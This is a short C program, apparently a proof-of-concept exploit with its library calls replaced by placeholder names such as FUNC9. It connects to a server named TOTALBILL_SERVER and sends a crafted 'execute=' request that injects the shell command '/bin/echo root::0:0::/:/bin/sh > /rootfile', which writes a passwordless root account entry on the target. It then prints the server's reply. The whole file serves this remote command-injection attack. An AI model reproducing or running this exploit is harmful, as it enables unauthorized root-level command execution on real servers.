#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct sockaddr_in {int /*<<< orphan*/  sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {int /*<<< orphan*/  h_length; int /*<<< orphan*/ * h_addr_list; } ;
typedef  int /*<<< orphan*/  servaddr ;
typedef  int /*<<< orphan*/  buf ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  TOTALBILL_PORT ; 
 char* TOTALBILL_SERVER ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 scalar_t__ FUNC1 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  errno ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ,char*,char*,...) ; 
 struct hostent* FUNC3 (char*) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC6 (struct sockaddr_in*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC7 (char*,...) ; 
 scalar_t__ FUNC8 (int,char*,int) ; 
 int FUNC9 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 char* FUNC10 (int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC11 (char*) ; 
 scalar_t__ FUNC12 (int,char*,scalar_t__) ; 

int FUNC13 (void) 
{
  struct sockaddr_in servaddr;
  char *tempstr, buf[8192];
  struct hostent *host;
  int sockfd;
   
  if ((sockfd = FUNC9 (AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) 
    {
      FUNC2 (stderr, "Error: Could not create a socket: %s\n", 
               FUNC10 (errno));
      return (1);
    }
  FUNC6 (&servaddr, 0, sizeof (servaddr));
  servaddr.sin_family = AF_INET;
  servaddr.sin_port = FUNC4 (TOTALBILL_PORT);

  if ((host = FUNC3 (TOTALBILL_SERVER)) == NULL) 
    {
      FUNC2 (stderr, "Error: Could not look up %s\n", TOTALBILL_SERVER);
      return (1);
    }

  FUNC5 (&servaddr.sin_addr, host->h_addr_list[0], host->h_length);
  if (FUNC1 (sockfd, (struct sockaddr *) &servaddr, sizeof (servaddr)) < 0) 
    {
      FUNC2 (stderr, "Error: Cannot connect to %s: %s\n", TOTALBILL_SERVER, 
               FUNC10 (errno));
      return (1);
    }
  tempstr = "123456  execute  execute  execute=/bin/echo+root::0:0::/:/bin/sh+>+/rootfile";
  FUNC7 ("Sending command %s to %s\n", tempstr, TOTALBILL_SERVER);
  if (FUNC12 (sockfd, tempstr, FUNC11 (tempstr) + 1) < 0) 
    {
      FUNC2 (stderr, "Error: Cannot write to socket: %s\n", FUNC10 (errno));
      return (1);
    }
  FUNC7 ("Sent...waiting for response...\n");
  if (FUNC8 (sockfd, buf, sizeof (buf)) < 0) 
    {
      FUNC2 (stderr, "Error: Cannot read from socket: %s\n", FUNC10 (errno));
      return (1);
    }
  FUNC7 ("Received %s from server\n", buf);
  FUNC0 (sockfd);
  return (0);
}